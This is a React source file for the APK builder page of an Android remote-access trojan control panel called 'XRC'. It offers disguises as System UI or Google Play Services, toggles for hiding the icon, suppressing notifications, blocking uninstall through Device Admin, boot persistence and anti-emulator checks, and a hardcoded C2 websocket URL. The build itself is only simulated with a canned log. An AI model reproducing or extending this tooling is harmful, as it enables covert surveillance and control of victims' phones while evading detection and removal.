import { useState } from 'react';
import Toggle from '@/components/Toggle';

const BRANDS = ['XRC Factory', 'System UI', 'Google Play Services', 'Device Intelligence'];

export default function Builder() {
  const [name, setName] = useState('XRC');
  const [packageName, setPackageName] = useState('com.android.system.xrc');
  const [icon, setIcon] = useState('system');
  const [fud, setFud] = useState(true);
  const [stealth, setStealth] = useState(true);
  const [antiUninstall, setAntiUninstall] = useState(true);
  const [persistence, setPersistence] = useState(true);
  const [antiEmulator, setAntiEmulator] = useState(true);
  const [signing, setSigning] = useState('release');
  const [building, setBuilding] = useState(false);
  const [log, setLog] = useState('');

  const build = () => {
    setBuilding(true);
    setLog('queueing build job…');
    window.setTimeout(() => {
      setLog([
        '[1/6] fetching base AOSP template… ok',
        `[2/6] applying package ${packageName}… ok`,
        '[3/6] injecting bootstrap (websocket + AES)… ok',
        '[4/6] assembling debug variant (R8 off)… ok',
        '[5/6] zipalign + apksigner (release key)… ok',
        '[6/6] artifact ready: xrc.apk · 4.2 MB · sha256 9f2c…',
      ].join('\n'));
      setBuilding(false);
    }, 2500);
  };

  return (
    <div className="grid gap-4 lg:grid-cols-2">
      <div className="space-y-4">
        <div className="rounded-xl border border-slate-800 bg-surface p-4 space-y-3">
          <div className="text-[10px] font-bold tracking-widest text-slate-500">APK CONFIGURATION</div>
          <Field label="Display name" value={name} onChange={setName} />
          <Field label="Package id" value={packageName} onChange={setPackageName} mono />
          <div>
            <div className="text-[11px] text-slate-500 mb-1.5">Launcher icon set</div>
            <div className="grid grid-cols-3 gap-2">
              {BRANDS.map((b) => (
                <button
                  key={b}
                  onClick={() => setIcon(b)}
                  className={`rounded-lg border px-3 py-2 text-[11px] font-semibold transition-colors ${
                    icon === b ? 'border-cyan-500/50 bg-cyan-500/10 text-cyan-300' : 'border-slate-700 bg-slate-900 text-slate-400 hover:text-slate-200'
                  }`}
                >
                  {b}
                </button>
              ))}
            </div>
          </div>
          <div className="space-y-2">
            <Row label="FUD — hide icon + rename process" checked={fud} onChange={setFud} />
            <Row label="Stealth — no notification, no activity" checked={stealth} onChange={setStealth} />
            <Row label="Anti-uninstall wall + Device Admin" checked={antiUninstall} onChange={setAntiUninstall} />
            <Row label="Boot/network persistence + reconnect-forever" checked={persistence} onChange={setPersistence} />
            <Row label="Anti-emulator / anti-analysis checks" checked={antiEmulator} onChange={setAntiEmulator} />
          </div>
          <div>
            <div className="text-[11px] text-slate-500 mb-1.5">Signing</div>
            <div className="grid grid-cols-2 gap-2">
              {['debug', 'release'].map((s) => (
                <button
                  key={s}
                  onClick={() => setSigning(s)}
                  className={`rounded-lg border px-3 py-2 text-[11px] font-bold uppercase tracking-wider transition-colors ${
                    signing === s ? 'border-cyan-500/50 bg-cyan-500/10 text-cyan-300' : 'border-slate-700 bg-slate-900 text-slate-500'
                  }`}
                >
                  {s}
                </button>
              ))}
            </div>
          </div>
        </div>

        <div className="rounded-xl border border-slate-800 bg-surface p-4">
          <div className="text-[10px] font-bold tracking-widest text-slate-500 mb-2">C2 ENDPOINT</div>
          <Field label="Callback URL" value="wss://fasonrat-yvtl.onrender.com/socket.io" onChange={() => {}} disabled />
          <div className="text-[10px] text-slate-600 mt-2">baked into the APK at build time — change before rebuilding.</div>
        </div>

        <button
          onClick={build}
          disabled={building}
          className="w-full rounded-xl border border-cyan-500/50 bg-cyan-500/10 py-3 text-sm font-black tracking-widest text-cyan-300 hover:bg-cyan-500/20 disabled:opacity-50"
        >
          {building ? 'BUILDING…' : '⚒ BUILD XRC.APK'}
        </button>
      </div>

      <div className="rounded-xl border border-slate-800 bg-surface p-4">
        <div className="text-[10px] font-bold tracking-widest text-slate-500 mb-3">BUILD OUTPUT</div>
        <pre className="h-[420px] overflow-y-auto rounded-lg bg-black/40 border border-slate-900 p-3 text-[11px] font-mono text-emerald-400 whitespace-pre-wrap">
          {log || '// no build jobs yet — configure and hit BUILD'}
        </pre>
      </div>
    </div>
  );
}

function Field({ label, value, onChange, mono, disabled }: { label: string; value: string; onChange: (v: string) => void; mono?: boolean; disabled?: boolean }) {
  return (
    <div>
      <div className="text-[11px] text-slate-500 mb-1">{label}</div>
      <input
        value={value}
        disabled={disabled}
        onChange={(e) => onChange(e.target.value)}
        className={`w-full rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs text-slate-200 placeholder:text-slate-600 outline-none focus:border-cyan-500/50 disabled:opacity-50 ${mono ? 'font-mono' : ''}`}
      />
    </div>
  );
}

function Row({ label, checked, onChange }: { label: string; checked: boolean; onChange: (v: boolean) => void }) {
  return (
    <div className="flex items-center justify-between gap-3">
      <span className="text-xs text-slate-300">{label}</span>
      <Toggle checked={checked} onChange={onChange} />
    </div>
  );
  }
